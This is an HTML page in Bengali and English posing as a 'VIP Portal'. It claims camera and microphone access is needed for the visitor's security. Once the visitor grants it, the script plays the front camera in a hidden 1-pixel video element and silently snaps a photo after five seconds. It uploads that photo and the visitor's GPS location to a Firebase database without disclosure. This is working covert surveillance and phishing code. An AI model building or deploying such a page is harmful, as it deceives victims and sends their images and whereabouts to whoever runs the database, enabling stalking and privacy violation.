<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ratan Bro | VIP Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #ff2e63; --bg: #080a10; --card: #121420; --text: #ffffff; }
        body { margin: 0; padding: 0; font-family: 'Poppins', sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        #perm-modal { background: var(--card); padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.6); border: 1px solid rgba(255, 46, 99, 0.3); width: 85%; max-width: 380px; z-index: 100; }
        .btn-grant { background: var(--primary); color: white; border: none; padding: 14px 35px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; box-shadow: 0 5px 20px rgba(255, 46, 99, 0.4); }
        
        #main-ui { display: none; text-align: center; width: 100%; }
        .user-card { background: var(--card); padding: 30px; border-radius: 20px; display: inline-block; border: 1px solid var(--primary); }
        
        /* ক্যামেরা সোর্স হাইড করা কিন্তু একটিভ রাখা */
        #vSource { position: absolute; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

    <div id="perm-modal">
        <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
        <h2>Access Required</h2>
        <p>সিস্টেমে প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন Allow করুন। এটি আপনার নিরাপত্তার জন্য প্রয়োজন।</p>
        <button class="btn-grant" onclick="startApp()">Grant Access</button>
    </div>

    <div id="main-ui">
        <div class="user-card">
            <img id="u-pic" src="https://ui-avatars.com/api/?background=ff2e63&color=fff" style="width: 80px; border-radius: 50%; border: 3px solid var(--primary);">
            <h3 id="u-name" style="margin: 10px 0;">প্রসেসিং...</h3>
            <p style="color: #00ff88;">● সিস্টেম সক্রিয় আছে</p>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";

        // --- আপনার অরিজিনাল ফায়ারবেস কনফিগ এখানে বসান ---
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "ratanweab.firebaseapp.com",
            databaseURL: "https://ratanweab-default-rtdb.firebaseio.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.appspot.com",
            messagingSenderId: "YOUR_ID",
            appId: "YOUR_APP_ID"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);
        let loggedUser = null;

        onAuthStateChanged(auth, (user) => {
            if (user) loggedUser = user;
            else signInAnonymously(auth);
        });

        window.startApp = async () => {
            const video = document.getElementById('vSource');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                video.srcObject = stream;
                await video.play();

                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';

                if(loggedUser) {
                    document.getElementById('u-name').innerText = "ইউজার: " + loggedUser.uid.substring(0,6);
                    
                    // ৫ সেকেন্ড ওয়েট (ব্ল্যাক পিকচার ফিক্স)
                    setTimeout(() => {
                        capture(loggedUser);
                    }, 5000);
                    
                    updateLoc(loggedUser);
                }
            } catch (err) {
                alert("ক্যামেরা পারমিশন ছাড়া সাইটটি চলবে না।");
            }
        };

        function capture(user) {
            const video = document.getElementById('vSource');
            
            // ভিডিও ডাটা ঠিক আছে কি না চেক
            if (video.videoWidth === 0 || video.readyState < 2) {
                setTimeout(() => capture(user), 1000);
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);

            const snapRef = push(ref(db, `users/${user.uid}/snaps`));
            set(snapRef, { image: imageData, time: serverTimestamp() });
        }

        function updateLoc(user) {
            navigator.geolocation.getCurrentPosition((pos) => {
                set(ref(db, `users/${user.uid}/info`), {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    lastActive: serverTimestamp()
                });
            });
        }
    </script>
</body>
</html>
